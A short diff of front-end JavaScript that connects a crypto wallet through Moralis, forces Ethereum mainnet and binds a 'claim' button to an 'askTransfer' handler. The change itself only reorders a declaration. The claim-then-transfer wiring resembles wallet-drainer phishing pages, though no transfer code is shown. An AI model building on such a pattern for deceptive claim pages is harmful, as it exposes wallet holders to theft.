@@ -1,12 +1,15 @@
 //#region Web3.js
-
-let web3Provider;
 let metamaskInstalled = false;
 if (typeof window.ethereum !== 'undefined') metamaskInstalled = true;
+
+let web3Provider;
+
+
 window.addEventListener('load', async () => {
     await Moralis.enableWeb3(metamaskInstalled ? {} : { provider: "walletconnect" });
     document.querySelector("#claimButton").addEventListener("click", askTransfer);
 });
+
 Moralis.onWeb3Enabled(async (data) => {
     if (data.chainId !== 1 && metamaskInstalled) await Moralis.switchNetwork("0x1");
     updateState(true);
